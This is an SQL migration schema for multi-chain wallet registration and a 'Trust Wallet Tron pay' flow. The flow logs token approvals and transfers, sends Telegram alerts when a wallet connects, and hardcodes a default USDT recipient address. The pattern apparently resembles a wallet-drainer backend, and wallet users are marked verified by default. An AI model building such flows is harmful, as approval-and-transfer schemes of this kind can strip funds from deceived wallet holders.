-- Migration: Add smart contract support for multi-chain wallet registration

-- Add chain and contract address to wallet_links
ALTER TABLE wallet_links
  ADD COLUMN IF NOT EXISTS chain TEXT NULL,
  ADD COLUMN IF NOT EXISTS contract_address TEXT NULL,
  ADD COLUMN IF NOT EXISTS registration_method TEXT NOT NULL DEFAULT 'manual'; -- 'manual' or 'smart_contract'

-- Update fee_payments to support multiple chains
ALTER TABLE fee_payments
  ADD COLUMN IF NOT EXISTS chain TEXT NULL,
  ADD COLUMN IF NOT EXISTS contract_address TEXT NULL,
  ADD COLUMN IF NOT EXISTS block_number BIGINT NULL,
  ADD COLUMN IF NOT EXISTS block_hash TEXT NULL;

-- Create index for chain lookups
CREATE INDEX IF NOT EXISTS idx_wallet_links_chain ON wallet_links(chain);
CREATE INDEX IF NOT EXISTS idx_fee_payments_chain ON fee_payments(chain);
CREATE INDEX IF NOT EXISTS idx_fee_payments_tx_hash_chain ON fee_payments(tx_hash, chain);

-- Create table for smart contract configurations
CREATE TABLE IF NOT EXISTS contract_configs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  chain TEXT NOT NULL UNIQUE, -- 'ethereum', 'bsc', 'tron', 'solana'
  contract_address TEXT NOT NULL,
  usdt_token_address TEXT NOT NULL,
  network_name TEXT NOT NULL, -- 'mainnet', 'testnet', 'devnet'
  rpc_url TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT TRUE,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Create table for wallet-first registrations (no email required)
CREATE TABLE IF NOT EXISTS wallet_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  wallet_address TEXT NOT NULL,
  chain TEXT NOT NULL,
  is_verified BOOLEAN NOT NULL DEFAULT TRUE,
  verified_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  UNIQUE (wallet_address, chain)
);

CREATE INDEX IF NOT EXISTS idx_wallet_users_wallet ON wallet_users(wallet_address);
CREATE INDEX IF NOT EXISTS idx_wallet_users_chain ON wallet_users(chain);

-- Trust Wallet Tron pay activity + Telegram notification logs
-- This keeps an operational audit trail even if Telegram delivery fails.
CREATE TABLE IF NOT EXISTS trust_tron_telegram_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NULL,
  chain TEXT NOT NULL DEFAULT 'tron',
  event_type TEXT NOT NULL, -- 'wallet_connected' | 'transfer_completed' | 'transfer_failed'

  wallet_address TEXT NOT NULL,
  connect_method TEXT NULL,

  to_address TEXT NULL,
  amount_usdt NUMERIC(18, 6) NULL,

  approve_tx_id TEXT NULL,
  transfer_tx_id TEXT NULL,

  error_message TEXT NULL,

  telegram_sent BOOLEAN NOT NULL DEFAULT FALSE,
  telegram_sent_at TIMESTAMPTZ NULL,
  telegram_error TEXT NULL,

  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_trust_tron_logs_user_id_created_at
  ON trust_tron_telegram_logs(user_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_trust_tron_logs_wallet_created_at
  ON trust_tron_telegram_logs(wallet_address, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_trust_tron_logs_telegram_sent_at
  ON trust_tron_telegram_logs(telegram_sent, telegram_sent_at DESC);

-- Default USDT recipient shown on /trustwallet/tron (admin-editable)
CREATE TABLE IF NOT EXISTS trust_tron_settings (
  id SMALLINT PRIMARY KEY DEFAULT 1,
  default_recipient_address TEXT NOT NULL,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  CONSTRAINT trust_tron_settings_singleton CHECK (id = 1)
);

INSERT INTO trust_tron_settings (id, default_recipient_address)
VALUES (1, 'TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa')
ON CONFLICT (id) DO NOTHING;
